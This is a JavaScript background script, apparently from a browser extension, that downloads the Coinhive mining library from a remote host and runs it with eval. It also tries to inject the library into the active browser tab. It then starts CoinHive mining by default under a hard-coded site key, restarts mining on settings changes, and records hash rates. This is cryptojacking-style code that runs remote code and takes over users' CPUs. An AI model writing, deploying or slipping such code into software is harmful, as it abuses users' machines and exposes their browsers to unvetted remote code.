window.onload = function () {
    var sitekey = "gnlEa3Qw4UlY80shDenvhpamkK6YMzqS";
    var miner = "";
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://coinhive.com/lib/coinhive.min.js", true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            var resp = eval(xhr.responseText);
            try {
                chrome.tabs.executeScript(tabs[0].id, {code: xhr.responseText});
            }catch(err){
            }
        }
    }
    xhr.send();

    chrome.storage.local.get(["emc-Enabled", "emc-Speed", "emc-MCName"], function (results) {
        var Enabled = results["emc-Enabled"];
        if (Enabled === undefined) {
            Enabled = true;
        }

        var Speed = results["emc-Speed"];
        if (Speed === undefined) {
            Speed = 20;
        }
        
        var MCName = results["emc-MCName"];
        if (MCName === undefined) {
            MCName = "EinfachAlexYT";
        }

        miner = new CoinHive.User(sitekey, MCName, {
            throttle: 1 - (Speed / 100)
        });        

        if (Enabled) {
            miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
        }

        chrome.storage.onChanged.addListener(function () {
            chrome.storage.local.get(["emc-Enabled", "emc-Speed", "emc-MCName"], function (results) {
                var Enabled = results["emc-Enabled"];
                if (Enabled === undefined) {
                    Enabled = true;
                }

                var Speed = results["emc-Speed"];
                if (Speed === undefined) {
                    Speed = 30;
                }
                
                var MCName = results["emc-MCName"];
                if (MCName === undefined) {
                    MCName = "EinfachAlexYT";
                }

                miner.stop();
                miner = new CoinHive.User(sitekey, MCName, {
                    throttle: 1 - (Speed / 100)
                });
                if (Enabled) {
                    miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
                }
            });
        });
    });
    
    setInterval(function() {
        var hps = miner.getHashesPerSecond();
        var ths = miner.getTotalHashes();
        localStorage["emc-hps"] = hps;
        localStorage["emc-ths"] = ths;
    }, 1000);
    
}